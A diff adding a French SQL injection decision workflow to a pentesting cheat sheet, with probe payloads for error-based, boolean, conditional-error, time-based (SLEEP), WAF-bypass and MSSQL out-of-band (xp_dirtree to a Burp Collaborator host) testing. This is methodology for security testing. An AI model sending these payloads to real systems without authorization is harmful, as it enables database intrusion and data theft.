@@ -16,6 +16,77 @@ tags:
 
 ---
 
+## 0. Workflow de décision — identification de la faille
+
+!!! note "Principe"
+    Tester dans l'ordre. Dès qu'un test est concluant, arrêter cette étape et passer à l'exploitation correspondante (voir section 12).
+
+**Étape 1 — Casser la syntaxe :**
+
+```sql
+'
+```
+
+- → Erreur SQL brute affichée (`Unclosed quotation mark...`, `You have an error in your SQL syntax...`) : **In-Band / Error-Based exploitable** → aller en 12.13.
+- → `HTTP 500` sans détail, ou page blanche/cassée : syntaxe cassée confirmée mais message masqué → passer à l'étape 2 pour qualifier le type de Blind.
+- → Aucun changement, page normale : soit paramétré/échappé, soit paramètre non réfléchi dans une requête SQL → tester `''` pour confirmer :
+  ```sql
+  ''
+  ```
+  - → page redevient normale avec `''` : confirme bien un contexte SQL string, mais correctement échappé pour l'apostrophe simple → tester filtres/encodage (étape 5) avant de conclure "non vulnérable".
+  - → aucun changement même avec `''` : probablement non injectable sur ce paramètre par ce vecteur, tester un autre paramètre/en-tête.
+
+**Étape 2 — Tester une condition VRAIE vs FAUSSE (contenu de la réponse) :**
+
+```sql
+' OR '1'='1
+' AND '1'='2
+```
+
+- → contenu différent entre les deux (plus/moins de résultats, texte présent/absent) : **Boolean-Based Blind exploitable** → aller en 12.11.
+- → contenu strictement identique dans les deux cas : passer à l'étape 3.
+
+**Étape 3 — Tester le code de statut HTTP conditionnel :**
+
+```sql
+' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END)=1--
+' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END)=1--
+```
+
+- → `HTTP 500` sur la 1ʳᵉ, `HTTP 200` sur la 2ᵉ : **erreurs conditionnelles exploitables** → aller en 12.12.
+- → statut identique dans les deux cas : passer à l'étape 4.
+
+**Étape 4 — Tester le délai de réponse :**
+
+```sql
+' AND SLEEP(5)--       -- adapter la syntaxe au SGBD si déjà identifié (12.14)
+```
+
+- → réponse retardée de ~5s de façon reproductible : **Time-Based Blind exploitable** → aller en 12.15.
+- → aucun délai observé : passer à l'étape 5.
+
+**Étape 5 — Suspicion de filtre/WAF :**
+
+```sql
+SeLeCT 1
+SELECT/**/1
+```
+
+- → requête en clair bloquée (`403`) mais variante obfusquée passe : **filtre contournable** → aller en 12.18/12.19/12.20, puis reprendre l'étape 1.
+- → toujours bloqué quelle que soit la variante : filtrage robuste sur ce vecteur, tester un autre paramètre/en-tête (12.24) ou un autre point d'entrée (formulaire relisant une donnée stockée → 12.21).
+
+**Étape 6 — Aucun signal exploitable (pas d'erreur, pas de diff de contenu, pas de délai, pas de filtre à contourner) :**
+
+- → tester une interaction Out-of-Band (nécessite un serveur d'écoute externe type Burp Collaborator) :
+  ```sql
+  -- MSSQL
+  '; exec master..xp_dirtree '//SUBDOMAIN.burpcollaborator.net/a'--
+  ```
+  - → interaction DNS/HTTP reçue sur le serveur d'écoute : **OAST exploitable** → aller en 12.16/12.17.
+  - → aucune interaction reçue : le SGBD ne dispose probablement pas des privilèges/fonctions réseau nécessaires, ou le paramètre n'est réellement pas injectable → conclure "non exploitable par SQLi sur ce vecteur" et passer au paramètre suivant.
+
+---
+
 ## 1. Concaténation de chaînes (String Concatenation)
 
 | SGBD | Syntaxe |
